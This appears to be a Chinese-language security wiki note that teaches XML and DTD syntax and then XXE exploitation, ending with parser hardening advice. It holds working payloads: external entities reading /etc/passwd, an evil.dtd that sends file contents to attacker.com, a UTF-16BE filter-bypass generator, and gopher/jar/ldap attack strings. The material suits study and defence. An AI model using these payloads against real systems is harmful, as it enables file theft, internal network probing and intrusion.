---
title: XXE漏洞核心基础与进阶利用：XML语法树、DTD声明、实体引用攻击原理、外部DTD引入、Blind XXE带外数据外带、编码绕过与自动化扫描
description: 系统梳理 XXE 漏洞利用核心基础与进阶技术：XML 语法树结构、DTD 声明类型、实体引用分类（内部/外部/参数实体）、PCDATA 与
  CDATA 差异，及外部实体通过 file/http 等协议实现任意文件读取的攻击原理。深度覆盖外部 DTD 引入自定义攻击、Blind XXE 带外数据外带（日志/文件写入）、UTF-16BE
  编码绕过关键字过滤、HTTP 协议禁用时的替代协议绕过、XXE 自动化扫描工具 XXEinjiector 等进阶利用链。
category: program-analysis
tags:
- XXE
- XML
- DTD
- 实体引用
- 外部实体
- 任意文件读取
- 漏洞原理
- Web安全
- Blind XXE
- 带外数据外带
- UTF-16BE
- 协议绕过
- XXEinjiector
- 自动化扫描
date: '2023-04-16'
updated: '2026-11-14'
---

## XML 基础与树结构

### XML 定义与设计宗旨

XML（EXtensible Markup Language，可扩展标记语言）是一种标记语言，设计宗旨是**传输和存储数据**，而非显示数据。与 HTML 不同，XML 标签未被预定义，需自行定义，具有自我描述性。

**核心差异对比**：

| 特性 | XML | HTML |
|------|-----|------|
| 目的 | 传输/存储数据，关注内容 | 显示数据，关注外观 |
| 标签 | 自定义 | 预定义 |
| 语法严格性 | 必须良构（well-formed） | 宽容错误 |

### XML 文档树结构示例

```xml
<?xml version='1.0' encoding='utf-8'?>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

- **XML 声明**：`<?xml version='1.0' encoding='utf-8'?>` —— 定义版本与编码，可选但若存在必须置于首行
- **根元素**：`<note>` —— 唯一根节点，所有其他元素的父元素
- **子元素**：`<to>`、`<from>`、`<heading>`、`<body>` —— 同级元素互为同胞节点

### XML 语法规则

1. **所有元素必须有关闭标签**  
   `<to></to>` 或自闭合 `<br />`（声明非 XML 一部分，无需闭合）

2. **标签大小写敏感**  
   `<Message>` 与 `<message>` 不同

3. **必须正确嵌套**  
   `<b><i>文本</i></b>` ✓ / `<b><i>文本</b></i>` ✗

4. **属性值必须加引号**  
   `<note date="12/11/2007">` ✓ / `<note date=12/11/2007>` ✗

5. **实体引用** —— 替换特殊字符  
   XML 中 `<` 与 `&` 非法，需用预定义实体：

   | 字符 | 实体引用 |
   |------|----------|
   | `<`  | `&lt;`   |
   | `>`  | `&gt;`   |
   | `&`  | `&amp;`  |
   | `"`  | `&quot;` |
   | `'`  | `&apos;` |

6. **注释**：`<!-- 注释内容 -->`
7. **空格保留**：XML 保留所有空白字符，HTML 会合并多空格

### XML 元素与命名规则

**元素组成**：开始标签 + 内容（文本/子元素/属性/混合） + 结束标签

**命名约束**：
- 可含字母、数字、其他字符
- 不能以数字/标点/字母 `xml`（任意大小写）开头
- 不能包含空格
- 无保留字

### XML 属性使用原则

属性提供非数据核心的元数据（如文件类型）：

```xml
<file type="gif">computer.gif</file>
```

**避免滥用属性**的原因：
- 不能包含多个值（元素可）
- 不能表达树结构（元素可）
- 扩展性差

仅在需用 ID 标识元素时使用属性，其余场景首选子元素。

---

## DTD（文档类型定义）

### DTD 作用与分类

DTD 定义 XML 文档的合法构建模块，**验证通过的 XML 称为"合法" XML**；仅语法正确称为"形式良好" XML。

两种声明方式：
- **内部 DTD**：嵌入 XML 文档
- **外部 DTD**：引用 `.dtd` 文件

### 内部 DOCTYPE 声明语法

```xml
<!DOCTYPE 根元素 [元素声明]>
```

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
<note>...</note>
```

- `<!DOCTYPE note>`：文档类型为 `note`（根元素）
- `<!ELEMENT note (to,from,heading,body)>`：`note` 包含四个子元素，顺序固定
- `<!ELEMENT to (#PCDATA)>`：`to` 类型为被解析字符数据

### 外部 DTD 引用语法

```xml
<!DOCTYPE 根元素 SYSTEM "文件名">
```

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>...</note>
```

`note.dtd` 内容：

```dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

### PCDATA 与 CDATA 差异

| 特性 | PCDATA (Parsed Character Data) | CDATA (Character Data) |
|------|--------------------------------|------------------------|
| 解析行为 | 被解析器解析 | **不被解析** |
| 标签处理 | 视为标记 | 视为普通文本 |
| 实体处理 | 展开实体引用 | 不展开，原样保留 |
| 非法字符 | 不得含 `&` `<` `>` | 仅 `]]>` 结束标记受限 |
| 典型用途 | 普通文本内容 | 包含标记/代码片段的文本 |

**PCDATA 转义要求**：`&` → `&amp;`、`<` → `&lt;`、`>` → `&gt;`

---

## DTD 元素声明分类

### 声明语法通式

```dtd
<!ELEMENT 元素名 类别>
```

### 四大类别

| 类别关键字 | 含义 | 示例 |
|------------|------|------|
| `EMPTY` | 空元素 | `<!ELEMENT br EMPTY>` |
| `(#PCDATA)` | 仅含解析字符数据 | `<!ELEMENT title (#PCDATA)>` |
| `ANY` | 任意可解析数据组合 | `<!ELEMENT desc ANY>` |
| 子元素列表 | 指定子元素名、顺序、出现次数 | `<!ELEMENT note (to,from,heading,body)>` |

**子元素出现次数控制符**：

| 符号 | 含义 |
|------|------|
| 无 | 恰好一次 |
| `?` | 零次或一次 |
| `*` | 零次或多次 |
| `+` | 一次或多次 |
| `\|` | 或关系（二选一） |
| `,` | 顺序关系（必须按序） |

示例：`<!ELEMENT note (to+, from?, header*, body)>`


---

## DTD 实体声明与 XXE 攻击核心

### 实体概念

实体是定义引用普通文本或特殊字符的**变量**，分三类：
- **内部实体**（内部声明）
- **外部实体**（引用外部资源，**XXE 攻击核心**）
- **参数实体**（仅在 DTD 内部使用，以 `%` 标识）

### 内部实体声明

```dtd
<!ENTITY 实体名 "实体值">
```

引用方式：`&实体名;`

示例：

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe "内部实体内容">
]>
<foo>&xxe;</foo>
```

> **注意**：`&` 符号在 HTTP 参数传递中需 URL 编码（`%26`），否则会被视为参数分隔符。

### 外部实体声明 —— XXE 攻击向量

```dtd
<!ENTITY 实体名 SYSTEM "URI/URL">
```

**支持协议**（视解析器实现而异，通用协议如下）：

| 协议 | 用途 | 示例 |
|------|------|------|
| `file://` | 读取本地文件 | `file:///etc/passwd` |
| `http://` / `https://` | 发起 HTTP 请求、探测内网 | `http://internal/api` |
| `ftp://` | FTP 交互 | `ftp://user:pass@host/file` |
| `php://` | PHP 伪协议（过滤器/输入流） | `php://filter/read=convert.base64-encode/resource=/etc/passwd` |
| `gopher://` | 发送原始 TCP 数据包 | 攻击 Redis/FastCGI 等 |
| `dict://` / `ldap://` / `jar://` | 其他服务交互 | — |

**攻击示例**：读取 `/etc/passwd`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

解析后，`&xxe;` 被替换为文件内容，导致敏感信息泄露。

> 此类攻击常结合 **SSRF（服务端请求伪造）**，通过外部实体探测内网、攻击内部服务。详见 [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]]、[[php伪协议与反序列化利用]]。

### 参数实体声明

仅在 DTD 中使用，声明与引用均带 `%`：

```dtd
<!ENTITY % 实体名 "实体值">
```

引用：`%实体名;`

**典型用途**：模块化 DTD、构造盲注 XXE 攻击链（通过外部 DTD 回带数据）。

示例：

```xml
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

`evil.dtd` 内容：

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

此链实现**带外数据外带**（OOB XXE），绕过无回显场景。

### 公共实体声明

```dtd
<!ENTITY 实体名 PUBLIC "公共标识符" "URI">
```

较少用于攻击，主要用于标准化 DTD 引用（如 XHTML DTD）。

---

## XXE 进阶利用技术

### 外部 DTD 引入自定义攻击

当目标服务器**未禁止引入外部实体**时，可通过引入攻击者控制的外部 DTD 文件实现更复杂的攻击链。外部 DTD 文件会被当作 XML 文件解析执行，从而允许攻击者定义任意实体组合。

**典型场景**：目标服务器可出网，攻击者拥有可控服务器。

**攻击流程**：

1. 攻击者在可控服务器部署 `evil.dtd`：

```dtd
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%eval;
%exfil;
```

2. 目标 XML 载荷引入外部 DTD：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root/>
```

3. 解析器依次处理：
   - 获取并解析 `evil.dtd`
   - 定义 `%file` 读取目标文件
   - 定义 `%eval` 构造带外发送实体 `%exfil`
   - 执行 `%eval`、`%exfil` 触发数据外带

**关键点**：
- 参数实体（`%name;`）仅在 DTD 内部可用，外部 DTD 引入后处于 DTD 上下文中，可使用参数实体
- 两次 `%eval; %exfil;` 调用实现“嵌套定义 → 触发发送”链式利用
- 此技术常用于 **Blind XXE（无回显 XXE）** 场景的数据外带

### Blind XXE 带外数据外带（日志/文件写入）

当应用**不回显解析结果**（如仅报错、空响应）时，需通过带外通道（OOB）获取数据。常见两种实现路径：

#### HTTP 请求日志外带（最通用）

利用外部实体发起 HTTP 请求至攻击者服务器，在服务器访问日志中捕获数据。

**Payload 示例**（结合外部 DTD）：

```dtd
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

攻击者服务器访问日志将记录：
```
GET /log?data=root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

#### 文件写入外带（需目标服务器权限允许）

若目标服务器支持 `file://` 协议**写入**（极少见，通常仅读），或配合特定解析器漏洞（如某些 Java 解析器允许 `file://` 写入），可尝试将数据写入本地文件再通过其他方式获取。更常见的是结合 **XXE + SSRF** 攻击内网服务（如 Redis 未授权写入 SSH Key、WebShell），详见 [[ssrf-ctf-exploitation-guide]]、[[php伪协议与反序列化利用]]。

**实战技巧**：
- 使用 `php://filter/read=convert.base64-encode/resource=...` 编码二进制/特殊字符文件，避免 XML 解析报错
- 大文件分块读取或仅读取关键行（如 `/etc/passwd` 前几行）
- 结合 DNSLog 平台（如 CeYe、Hyuga）实现无 HTTP 交互的 DNS 级外带，详见 [[mysql-dnslog-injection-loadfile-unc]] 同理思路

### UTF-16BE 编码绕过关键字过滤

当 WAF/过滤器对 `ENTITY`、`SYSTEM`、`file://` 等关键字进行**字节级匹配拦截**时，可利用 XML 解析器对编码的自动处理特性绕过。

**原理**：
- XML 声明指定 `encoding="UTF-16BE"` 时，解析器按 UTF-16BE（大端序，每字符 2 字节）解码文档
- 过滤器若仅按 ASCII/UTF-8 字节匹配关键字，无法识别 UTF-16BE 编码后的关键字字节序列
- 例如 `ENTITY` 在 UTF-16BE 为 `00 45 00 4E 00 54 00 49 00 54 00 59`，不包含 ASCII `ENTITY` 字节

**利用步骤**：

1. 构造标准 XML Payload
2. 转换为 UTF-16BE 编码（需包含 BOM `FE FF` 或在 XML 声明指定编码）
3. 发送原始字节流（注意：HTTP 传输需确保不被中间件再次编码转换）

**Python 生成示例**：

```python
payload = '''<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

# 转为 UTF-16BE（含 BOM）
encoded = 'FEFF' + payload.encode('utf-16be').hex()
print(bytes.fromhex(encoded))
```

**限制与对抗**：
- 部分解析器不支持 UTF-16BE 或强制要求 BOM
- 先进 WAF 会在解码后再匹配，需结合其他绕过（如大小写混淆、实体嵌套、注释插入）
- 参考：[UTF-16BE 绕过详解](https://cnblogs.com/20175211lyz/p/11413335.html)

### HTTP 协议禁用时的替代协议绕过

当目标环境**禁用 `http://`/`https://` 协议**（如解析器配置 `no_network=True`、防火墙拦截出站 HTTP）时，可尝试以下替代协议实现数据外带或 SSRF：

| 协议 | 适用场景 | 示例 |
|------|----------|------|
| `ftp://` | 目标允许 FTP 出站，可部署恶意 FTP 服务器记录登录/数据 | `ftp://attacker.com/%file;` |
| `gopher://` | 发送原始 TCP 数据包，攻击内网 Redis/FastCGI/MySQL 等 | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...` |
| `dict://` | 查询字典服务，可泄露数据至攻击者控制的 dict 服务器 | `dict://attacker.com:2628/%file;` |
| `ldap://` | LDAP 注入/外带，配合 JNDI 利用链 | `ldap://attacker.com/Exploit` |
| `jar://` | Java 环境加载远程 JAR 文件，可实现 RCE | `jar:http://attacker.com/exp.jar!/` |
| `netdoc://` / `mailto://` | 特定解析器支持，较少见 | — |

**实战组合**：
- **XXE + Gopher 协议攻击内网 Redis**：写入 SSH 公钥、定时任务、WebShell
- **XXE + FTP 协议被动模式外带**：攻击者 FTP 服务器记录 `USER`/`PASS` 命令中夹带的数据
- **XXE + DNS 协议**：结合 `doc://` 或特定解析器触发 DNS 查询，配合 DNSLog 平台无需 HTTP 交互

> 详细协议利用链见 [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]]、[[php伪协议与反序列化利用]]。

### XXE 自动化扫描工具 XXEinjiector

**XXEinjiector** 是一款基于 Ruby 编写的 XXE 漏洞自动化扫描/利用工具，核心原理是 **Payload Fuzzing** 与 **带外交互验证**。

**主要功能**：
- 自动生成多种 XXE Payload（文件读取、SSRF、Blind XXE OOB、DoS 等）
- 支持多协议 Fuzzing（file、http、ftp、gopher、php、dict 等）
- 集成带外验证平台（如 CeYe、Burp Collaborator、自建 HTTP/DNS 服务）
- 支持 POST/XML-RPC/SOAP 等多种请求格式注入点检测
- 可配置编码绕过（UTF-16BE、Base64、URL 编码等）

**使用流程**：
1. 安装 Ruby 环境及依赖
2. 配置带外验证服务器地址（Callback URL）
3. 指定目标 URL、参数位置、请求模板
4. 运行扫描，工具自动迭代 Payload 并监听回调验证漏洞存在性

**局限性**：
- 需要 Ruby 运行环境，部署相对繁琐
- 无法覆盖所有自定义解析器配置，需人工调整 Payload 模板
- 现代 WAF 对通用 Payload 拦截率高，实战需结合手工绕过技巧

**替代工具/方案**：
- **XXESERV**：Python 编写的 XXE 利用服务器，专注于 OOB 数据接收与 Payload 托管
- **Burp Suite 插件**（如 "XXE Scanner"、"Collaborator"）：集成在渗透测试工作流中
- **手工构造 + DNSLog/HTTPLog 平台**：最灵活，适合复杂环境

---

## XXE 攻击面总结与防御要点

### 攻击影响

| 攻击类型 | 影响 | 典型 Payload |
|----------|------|--------------|
| 任意文件读取 | 读取服务器本地敏感文件 | `file:///etc/passwd`、`file:///c:/windows/win.ini` |
| SSRF / 内网探测 | 访问内网服务、云元数据接口 | `http://169.254.169.254/latest/meta-data/` |
| 拒绝服务 | 实体递归展开耗尽资源（Billion Laughs） | 嵌套实体指数级膨胀 |
| 端口扫描 | 通过 HTTP/协议差异探测端口开放 | `http://internal:port` |
| RCE 链 | 结合 `php://`、`gopher://` 攻击 FastCGI/Redis | 见 [[php伪协议与反序列化利用]]、[[ssrf-ctf-exploitation-guide]] |
| **Blind XXE OOB** | 无回显环境下通过外部 DTD/协议外带数据 | 外部 DTD + HTTP/DNS/FTP 回调 |
| **编码绕过** | 绕过关键字过滤 WAF | UTF-16BE、Base64、实体嵌套 |
| **替代协议** | 绕过 HTTP 协议禁用限制 | FTP、Gopher、Dict、LDAP、JAR |

### 防御措施

1. **禁用外部实体解析**（核心防御）
   - Java: `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 或 `setFeature("http://xml.org/sax/features/external-general-entities", false)`
   - Python lxml: `etree.XMLParser(resolve_entities=False, no_network=True)`
   - PHP: `libxml_disable_entity_loader(true)`（旧版本）

2. **禁用 DTD 声明**（最彻底）
   - Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - .NET: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`

3. **使用安全的解析器配置**（SAX/DOM/StAX 均需显式关闭外部实体）

4. **输入验证与白名单**：拒绝含 `<!DOCTYPE>`、`<!ENTITY>` 的 XML 输入

5. **最小权限原则**：解析 XML 的进程以最低权限运行，限制文件系统/网络访问

6. **监控与告警**：日志记录 XML 解析异常、大量实体展开、外部连接尝试

7. **输出编码与响应过滤**：防止解析结果直接回显导致敏感数据泄露

---

## 交叉引用与延伸阅读

- [[ssrf-bypass-techniques]] —— SSRF 绕过技巧与协议利用链（Gopher/FastCGI/Redis）
- [[ssrf-ctf-exploitation-guide]] —— CTFHUB SSRF 靶场实战利用链
- [[php伪协议与反序列化利用]] —— PHP `php://filter`、`gopher://` 等伪协议在 XXE/SSRF 中的应用
- [[mysql-dnslog-injection-loadfile-unc]] —— MySQL `load_file()` 结合 UNC 路径的 DNSLog 外带，思路与 XXE 外部实体异曲同工
- [[xd-security-deserialization-xxe-notes-day37-39]] —— XD安全课程 Day37-39 反序列化与 XXE 学习笔记原文归档
- [[vulnhub-platform-resource-index]] —— VulnHub 靶场实战环境，可练习 XXE 等漏洞复现

## 来源

- [0x00实验室-202108-202304_070](../sources/0x00实验室-202108-202304_070.md)
- [0x00实验室-202108-202304_089](../sources/0x00实验室-202108-202304_089.md)
